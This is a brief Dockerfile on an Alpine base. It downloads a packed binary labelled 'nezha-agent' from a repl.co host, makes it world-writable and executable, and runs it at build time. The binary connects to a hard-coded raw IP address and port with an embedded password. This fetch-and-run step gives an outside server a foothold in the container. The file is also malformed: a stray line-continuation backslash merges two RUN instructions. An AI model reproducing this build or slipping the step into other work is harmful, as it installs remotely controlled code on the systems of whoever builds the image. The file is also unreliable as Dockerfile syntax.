FROM alpine
RUN apk update \
	&& apk add bash curl
RUN wget -O two "https://eaf9667f-1b92-4954-874c-163755176aa8.id.repl.co/E5_File/Tools/bin/nezha-agent-amd64_linux-upx" \
	&& chmod 777 two \
RUN ./two -s 204.10.78.179:7777 -p shiyan01
CMD sh
